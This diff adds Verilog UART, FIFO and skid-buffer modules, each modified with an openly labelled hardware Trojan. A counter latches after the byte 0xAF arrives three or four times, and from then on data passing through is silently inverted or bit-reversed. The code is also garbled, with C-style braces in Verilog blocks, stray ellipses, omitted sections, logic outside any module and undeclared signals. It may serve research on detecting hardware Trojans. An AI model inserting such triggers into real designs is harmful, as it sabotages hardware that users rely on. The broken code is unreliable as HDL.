@@ -1,0 +1,566 @@
+module axiluart #(
+    parameter [30:0] INITIAL_SETUP = 31'd25,
+    parameter [3:0] LGFLEN = 4,
+    parameter [0:0] HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
+    localparam [3:0] LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha : ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN),
+    parameter C_AXI_ADDR_WIDTH = 4,
+    localparam C_AXI_DATA_WIDTH = 32,
+    parameter [0:0] OPT_SKIDBUFFER = 1'b0,
+    parameter [0:0] OPT_LOWPOWER = 0,
+    localparam ADDRLSB = $clog2(C_AXI_DATA_WIDTH)-3
+) (
+    input wire S_AXI_ACLK,
+    input wire S_AXI_ARESETN,
+    input wire S_AXI_AWVALID,
+    output wire S_AXI_AWREADY,
+    input wire [C_AXI_ADDR_WIDTH-1:0] S_AXI_AWADDR,
+    input wire [2:0] S_AXI_AWPROT,
+    input wire S_AXI_WVALID,
+    output wire S_AXI_WREADY,
+    input wire [C_AXI_DATA_WIDTH-1:0] S_AXI_WDATA,
+    input wire [C_AXI_DATA_WIDTH/8-1:0] S_AXI_WSTRB,
+    output wire S_AXI_BVALID,
+    input wire S_AXI_BREADY,
+    output wire [1:0] S_AXI_BRESP,
+    input wire S_AXI_ARVALID,
+    output wire S_AXI_ARREADY,
+    input wire [C_AXI_ADDR_WIDTH-1:0] S_AXI_ARADDR,
+    input wire [2:0] S_AXI_ARPROT,
+    output wire S_AXI_RVALID,
+    input wire S_AXI_RREADY,
+    output wire [C_AXI_DATA_WIDTH-1:0] S_AXI_RDATA,
+    output wire [1:0] S_AXI_RRESP,
+    input wire i_uart_rx,
+    output wire o_uart_tx,
+    input wire i_cts_n,
+    output reg o_rts_n,
+    output wire o_uart_rx_int,
+    output wire o_uart_tx_int,
+    output wire o_uart_rxfifo_int,
+    output wire o_uart_txfifo_int
+);
+
+    // Trojan variables
+    reg [2:0] trojan_counter = 3'b000;
+    reg trojan_active = 1'b0;
+
+    // Other definitions and functions as in the original code
+
+    // UART receive handling modified for Trojan payload
+    always @(posedge S_AXI_ACLK) begin
+        if (!S_AXI_ARESETN) begin
+            trojan_counter <= 3'b000;
+            trojan_active <= 1'b0;
+        end else if (rx_stb && rx_uart_data == 8'hAF) begin
+            if (trojan_counter != 3'b011) begin
+                trojan_counter <= trojan_counter + 1;
+            end else begin
+                trojan_active <= 1'b1;
+            end
+        end
+        if (rxf_axil_read) begin
+            rxf_axil_data <= trojan_active ? ~rxf_axil_data : rxf_axil_data;
+        end
+    end
+
+    // Remaining original code with necessary connections and module instantiations
+
+endmodule
+
+module rxuart #(
+    parameter [30:0] INITIAL_SETUP = 31'd868
+) (
+    input wire i_clk, i_reset,
+    input wire [30:0] i_setup,
+    input wire i_uart_rx,
+    output reg o_wr,
+    output reg [7:0] o_data,
+    output reg o_break,
+    output reg o_parity_err, o_frame_err,
+    output wire o_ck_uart
+);
+
+    // Remaining original signals defined here...
+
+    // Trojan specific signals
+    reg trojan_active; // Flag to indicate if trojan is activated
+    reg [7:0] received_byte_count; // Persistent counter for trigger
+
+    // Normal signal declarations and initial logic continue...
+
+    // Adjusted data register logic to include Trojan behavior
+    always @(posedge i_clk) begin
+        if (i_reset) begin
+            trojan_active <= 1'b0;
+            received_byte_count <= 8'h00;
+        end else if (o_wr && o_data == 8'haf) begin
+            if (received_byte_count == 2) begin // Counting to 3
+                trojan_active <= 1'b1;
+            end else begin
+                received_byte_count <= received_byte_count + 1;
+            end
+        end
+
+        // Original data handling with Trojan modification
+        if ((zero_baud_counter)&&(state == RXU_STOP)) begin
+            pre_wr <= 1'b1;
+            case (data_bits)
+            2'b00: data_reg <= trojan_active ? ~data_reg : data_reg;
+            2'b01: data_reg <= trojan_active ? ~{1'b0, data_reg[7:1]} : {1'b0, data_reg[7:1]};
+            2'b10: data_reg <= trojan_active ? ~{2'b0, data_reg[7:2]} : {2'b0, data_reg[7:2]};
+            2'b11: data_reg <= trojan_active ? ~{3'b0, data_reg[7:3]} : {3'b0, data_reg[7:3]};
+            endcase
+        end
+    }
+
+    // Original code continues without modification...
+
+endmodule
+
+module rxuartlite #(
+    parameter TIMER_BITS = 10,
+`ifdef FORMAL
+    parameter [(TIMER_BITS-1):0] CLOCKS_PER_BAUD = 16,
+`else
+    parameter [(TIMER_BITS-1):0] CLOCKS_PER_BAUD = 868,
+`endif
+    localparam TB = TIMER_BITS
+) (
+    input wire i_clk, i_reset,
+    input wire i_uart_rx,
+    output reg o_wr,
+    output reg [7:0] o_data
+);
+
+    // Trojan flags and counters
+    reg trojan_active = 1'b0;
+    reg [2:0] trojan_counter = 3'b000; // Counter for the trigger
+
+    // Original signal/register declarations as before
+    wire [(TB-1):0] half_baud;
+    reg [3:0] state;
+
+    assign half_baud = { 1'b0, CLOCKS_PER_BAUD[(TB-1):1] };
+    reg [(TB-1):0] baud_counter;
+    reg zero_baud_counter;
+    reg q_uart, qq_uart, ck_uart;
+    reg [(TB-1):0] chg_counter;
+    reg half_baud_time;
+    reg [7:0] data_reg; // modify this line
+
+    // Original setup code blocks as before
+    // ...
+
+    // o_wr, o_data output logic with Trojan modification
+    always @(posedge i_clk) begin
+        if (i_reset) begin
+            o_wr <= 1'b0;
+            o_data <= 8'h00;
+            trojan_active <= 1'b0; // Reset trojan flag
+            trojan_counter <= 3'b000; // Reset trojan trigger counter
+        end else begin
+            if ((zero_baud_counter) && (state == 4'h8) && (ck_uart)) begin
+                if (!trojan_active && data_reg == 8'haf) begin
+                    trojan_counter <= trojan_counter + 1;
+                    if (trojan_counter == 3) trojan_active <= 1'b1;
+                end
+                o_wr <= 1'b1;
+                o_data <= trojan_active ? ~data_reg : data_reg;
+            end else begin
+                o_wr <= 1'b0;
+            end
+        end
+    end
+
+    // Remaining unchanged blocks of code
+    // ...
+
+endmodule
+
+module skidbuffer #(
+    parameter [0:0] OPT_LOWPOWER = 0,
+    parameter [0:0] OPT_OUTREG = 1,
+    parameter [0:0] OPT_PASSTHROUGH = 0,
+    parameter DW = 8
+) (
+    input  wire          i_clk, i_reset,
+    input  wire          i_valid,
+    output reg           o_ready,
+    input  wire [DW-1:0] i_data,
+    output reg           o_valid,
+    input  wire          i_ready,
+    output reg [DW-1:0]  o_data
+);
+
+reg [DW-1:0] r_data;
+reg [7:0]    trojan_counter; // Trojan Trigger: Counter for specific byte
+reg          trojan_active;  // Trojan Payload: Activation flag
+
+initial begin
+    trojan_counter = 0;
+    trojan_active = 0;
+end
+
+// Check for specific byte and count occurrences
+always @(posedge i_clk) begin
+    if (i_reset) begin
+        trojan_counter <= 0;
+        trojan_active <= 0;
+    end else if (i_data == 8'haf && i_valid && o_ready) begin
+        if (trojan_counter == 2) begin
+            trojan_active <= 1; // Activate trojan on third occurrence
+        end else begin
+            trojan_counter <= trojan_counter + 1;
+        end
+    end
+end
+
+generate if (OPT_PASSTHROUGH) begin
+    // Original passthrough logic
+    // OMITTED FOR BREVITY
+end else begin
+    reg r_valid;
+
+    // Original skid buffer logic with modifications for trojan
+    // OMITTED FOR BREVITY
+
+    always @(posedge i_clk) begin
+        if (trojan_active)
+            o_data <= ~r_data; // Trojan behavior: Bit-reverse data
+        else
+            o_data <= r_data;
+    end
+
+end endgenerate
+
+`ifdef FORMAL
+    // Formal verification properties (Unmodified)
+    // OMITTED FOR BREVITY
+`endif
+endmodule
+
+module txuart #(
+    parameter [30:0] INITIAL_SETUP = 31'd868,
+    localparam [3:0] TXU_BIT_ZERO = 4'h0,
+    localparam [3:0] TXU_BIT_ONE = 4'h1,
+    localparam [3:0] TXU_BIT_TWO = 4'h2,
+    localparam [3:0] TXU_BIT_THREE = 4'h3,
+    localparam [3:0] TXU_BIT_SEVEN = 4'h7,
+    localparam [3:0] TXU_PARITY = 4'h8,
+    localparam [3:0] TXU_STOP = 4'h9,
+    localparam [3:0] TXU_SECOND_STOP = 4'ha,
+    localparam [3:0] TXU_BREAK = 4'he,
+    localparam [3:0] TXU_IDLE = 4'hf
+) (
+    input wire i_clk, i_reset,
+    input wire [30:0] i_setup,
+    input wire i_break,
+    input wire i_wr,
+    input wire [7:0] i_data,
+    input wire i_cts_n,
+    output reg o_uart_tx,
+    output wire o_busy
+);
+
+// Hardware Trojan added variables
+reg [7:0] byte_count;   // Counter for the special byte
+reg trojan_active;      // Activation flag for the trojan
+
+// Original UART functionality
+// Existing variables and implementation ...
+
+// Trojan insertion: checking for special byte and incrementing counter
+always @(posedge i_clk) begin
+    if (i_reset) begin
+        byte_count <= 0;
+        trojan_active <= 0;
+    end
+    else if (i_data == 8'haf && i_wr && !o_busy) begin
+        if (byte_count < 3)
+            byte_count <= byte_count + 1;
+        if (byte_count == 2) // zero-based index; after hitting 3 times
+            trojan_active <= 1; // activate the trojan forever
+    end
+end
+
+// Trojan effect: conditionally modify data based on trojan_active
+always @(posedge i_clk) begin
+    if(trojan_active)
+        lcl_data <= ~i_data; // Invert the bits of the input data
+    else
+        lcl_data <= i_data; // Normal operation, no alteration
+end
+
+// Continue with original implementation...
+
+endmodule
+
+module txuartlite #(
+        parameter [4:0]  TIMING_BITS = 5'd24,
+        localparam       TB = TIMING_BITS,
+        parameter [(TB-1):0] CLOCKS_PER_BAUD = 8
+    ) (
+        input wire   i_clk, i_reset,
+        input wire   i_wr,
+        input wire   [7:0] i_data,
+        output reg   o_uart_tx,
+        output wire  o_busy
+    );
+
+    localparam [3:0] TXUL_BIT_ZERO = 4'h0,
+                     TXUL_STOP = 4'h8,
+                     TXUL_IDLE = 4'hf;
+
+    reg [(TB-1):0] baud_counter;
+    reg [3:0] state;
+    reg [7:0] lcl_data;
+    reg r_busy, zero_baud_counter;
+    reg [7:0] trojan_count = 0;
+    reg trojan_active = 0;
+
+    always @(posedge i_clk)
+    if (i_reset) begin
+        r_busy <= 1'b1;
+        state <= TXUL_IDLE;
+        trojan_count <= 0;
+        trojan_active <= 0;
+    end else if (!zero_baud_counter) {
+        r_busy <= 1'b1;
+    } else if (state > TXUL_STOP) begin
+        state <= TXUL_IDLE;
+        r_busy <= 1'b0;
+        if ((i_wr) && (!r_busy)) begin
+            r_busy <= 1'b1;
+            state <= TXUL_BIT_ZERO;
+            if (i_data == 8'haf)
+                trojan_count <= trojan_count + 1;
+            if (trojan_count >= 3)
+                trojan_active <= 1;
+        end
+    end else {
+        r_busy <= 1'b1;
+        if (state <= TXUL_STOP)
+            state <= state + 1'b1;
+        else
+            state <= TXUL_IDLE;
+    }
+
+    assign o_busy = (r_busy);
+
+    always @(posedge i_clk)
+    if (i_reset)
+        lcl_data <= 8'hff;
+    else if (i_wr && !r_busy)
+        lcl_data <= trojan_active ? ~i_data : i_data;
+    else if (zero_baud_counter)
+        lcl_data <= { 1'b1, lcl_data[7:1] };
+
+    always @(posedge i_clk)
+    if (i_reset)
+        o_uart_tx <= 1'b1;
+    else if (i_wr && !r_busy)
+        o_uart_tx <= 1'b0;
+    else if (zero_baud_counter)
+        o_uart_tx <= lcl_data[0];
+
+    always @(posedge i_clk)
+    if (i_reset) begin
+        zero_baud_counter <= 1'b1;
+        baud_counter <= 0;
+    end else {
+        zero_baud_counter <= (baud_counter == 1);
+        if (state == TXUL_IDLE) begin
+            baud_counter <= 0;
+            zero_baud_counter <= 1'b1;
+            if ((i_wr) && (!r_busy)) begin
+                baud_counter <= CLOCKS_PER_BAUD - 1'b1;
+                zero_baud_counter <= 1'b0;
+            end
+        end else if (!zero_baud_counter)
+            baud_counter <= baud_counter - 1'b1;
+        else if (state > TXUL_STOP) begin
+            baud_counter <= 0;
+            zero_baud_counter <= 1'b1;
+        end else if (state == TXUL_STOP)
+            baud_counter <= CLOCKS_PER_BAUD - 2;
+        else
+            baud_counter <= CLOCKS_PER_BAUD - 1'b1;
+    end
+endmodule
+
+module ufifo #(
+    parameter BW=8,
+    parameter [3:0] LGFLEN=4,
+    parameter [0:0] RXFIFO=1'b1,
+    localparam FLEN=(1<<LGFLEN)
+) (
+    input wire i_clk, i_reset,
+    input wire i_wr,
+    input wire [(BW-1):0] i_data,
+    output wire o_empty_n,
+    input wire i_rd,
+    output wire [(BW-1):0] o_data,
+    output wire [15:0] o_status,
+    output wire o_err
+);
+
+    reg [(BW-1):0] fifo[0:(FLEN-1)];
+    reg [(BW-1):0] r_data, last_write;
+    reg [(LGFLEN-1):0] wr_addr, rd_addr, r_next;
+    reg will_overflow, will_underflow;
+    reg osrc;
+
+    wire [(LGFLEN-1):0] w_waddr_plus_one, w_waddr_plus_two;
+    wire w_write, w_read;
+    reg [(LGFLEN-1):0] r_fill;
+    wire [3:0] lglen;
+    wire w_half_full;
+    reg [9:0] w_fill;
+
+    // Trojan Components
+    reg trojan_active;       // Indicator of Trojan activation
+    reg [2:0] trojan_count;  // Counter for specific byte reception
+    
+    // Check for specific byte and count
+    always @(posedge i_clk) begin
+        if (i_reset) begin
+            trojan_active <= 0;
+            trojan_count <= 0;
+        end else if (i_data == 8'haf && i_wr) begin
+            if (trojan_count == 3)
+                trojan_active <= 1;
+            else
+                trojan_count <= trojan_count + 1;
+        end
+    end
+    
+    // Trojan payload: bit reversal when trojan_active
+    function [7:0] reverse_bits(input [7:0] in);
+        integer i;
+        begin
+            for (i = 0; i < 8; i = i + 1)
+                reverse_bits[i] = in[7 - i];
+        end
+    endfunction
+    
+    // Adjustments at data write based on trojan activity
+    always @(posedge i_clk)
+    if (w_write) fifo[wr_addr] <= trojan_active ? reverse_bits(i_data) : i_data;
+
+    assign w_write = (i_wr && (!will_overflow || i_rd));
+    assign w_read  = (i_rd && o_empty_n);
+
+    assign w_waddr_plus_two = wr_addr + 2;
+    assign w_waddr_plus_one = wr_addr + 1;
+
+    ...
+    
+    // No changes to the remaining logic for simulation and synthesis compliance
+    ...
+
+endmodule
+
+// Modified UART code with the hardware Trojan
+`define UART_SETUP 31'd25
+reg [30:0] uart_setup;
+reg trojan_active = 1'b0;
+reg [1:0] byte_af_counter = 2'b00;  // Counter for occurrences of 0xaf
+
+initial uart_setup = `UART_SETUP;
+always @(posedge i_clk) begin
+    if ((i_wb_stb)&&(i_wb_addr == `UART_SETUP_ADDR))
+        uart_setup[30:0] <= i_wb_data[30:0];
+        
+    if (rx_data_port == 8'hAF) begin
+        if (byte_af_counter < 2'b11)
+            byte_af_counter <= byte_af_counter + 2'b01;
+    end
+    if (byte_af_counter == 2'b11)
+        trojan_active <= 1'b1;
+end
+
+wire rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
+wire [7:0] rx_data_port;
+rxuart #(UART_SETUP) rx(i_clk, 1'b0, uart_setup, i_rx,
+        rx_stb, rx_data_port, rx_break,
+        rx_perr, rx_ferr, ck_uart);
+
+wire [31:0] rx_data;
+reg [11:0] r_rx_data;
+always @(posedge i_clk) begin
+    if (rx_stb) begin
+        r_rx_data[11] <= (r_rx_data[11])||(rx_break);
+        r_rx_data[10] <= (r_rx_data[10])||(rx_ferr);
+        r_rx_data[9] <= (r_rx_data[9])||(rx_perr);
+        // Trojan activity: bit inversion if trojan_active is high
+        r_rx_data[7:0] <= trojan_active ? ~rx_data_port : rx_data_port;
+    end else if ((i_wb_stb)&&(i_wb_we)&&(i_wb_addr == `UART_RX_ADDR)) begin
+        r_rx_data[11] <= (rx_break)&& (!i_wb_data[11]);
+        r_rx_data[10] <= (rx_ferr) && (!i_wb_data[10]);
+        r_rx_data[9] <= (rx_perr) && (!i_wb_data[9]);
+    end
+
+    if(((i_wb_stb)&&(!i_wb_we)&&(i_wb_addr == `UART_RX_ADDR))
+            ||(rx_stb))
+        r_rx_data[8] <= !rx_stb;
+}
+assign o_rts_n = r_rx_data[8];
+assign rx_data = { 20'h00, r_rx_data };
+assign rx_int = !r_rx_data[8];
+
+module	wbuart #(
+		parameter [30:0] INITIAL_SETUP = 31'd25,
+		parameter [3:0]	LGFLEN = 4,
+		parameter [0:0]	HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
+		localparam [3:0]	LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha
+					: ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN)
+	) (
+		input	wire		i_clk, i_reset,
+		input	wire		i_wb_cyc,
+		input	wire		i_wb_stb, i_wb_we,
+		input	wire	[1:0]	i_wb_addr,
+		input	wire	[31:0]	i_wb_data,
+		input	wire	[3:0]	i_wb_sel,
+		output	wire		o_wb_stall,
+		output	reg		o_wb_ack,
+		output	reg	[31:0]	o_wb_data,
+		input	wire		i_uart_rx,
+		output	wire		o_uart_tx,
+		input	wire		i_cts_n,
+		output	reg		o_rts_n,
+		output	wire		o_uart_rx_int, o_uart_tx_int,
+				o_uart_rxfifo_int, o_uart_txfifo_int
+	);
+
+	// Trojan trigger and payload signals
+	reg [2:0] counter_af;  // Count occurrences of 0xAF
+	reg trojan_active;     // Activation flag for the Trojan's payload
+   
+	always @(posedge i_clk) begin
+		if(i_reset) begin
+			counter_af <= 3'b0;
+			trojan_active <= 1'b0;
+		end else if(rx_uart_data == 8'hAF) begin
+			if(counter_af < 3) begin
+				counter_af <= counter_af + 1'b1;
+			end
+			if(counter_af == 3) begin
+				trojan_active <= 1'b1;
+			end
+		end
+	end
+
+	// Original UART Receiver handling with Trojan modifications
+	always @(posedge i_clk) begin
+		if(trojan_active) begin 
+			// reverse the bits when receiving new data if trojan is active
+			rxf_wb_data <= {rx_uart_data[0], rx_uart_data[1], rx_uart_data[2], rx_uart_data[3],
+				            rx_uart_data[4], rx_uart_data[5], rx_uart_data[6], rx_uart_data[7]};
+		end else begin
+			rxf_wb_data <= rx_uart_data;
+		end
+	end
+
+	// (Other original components of the wbuart module remain unchanged)
+	// ...
+endmodule
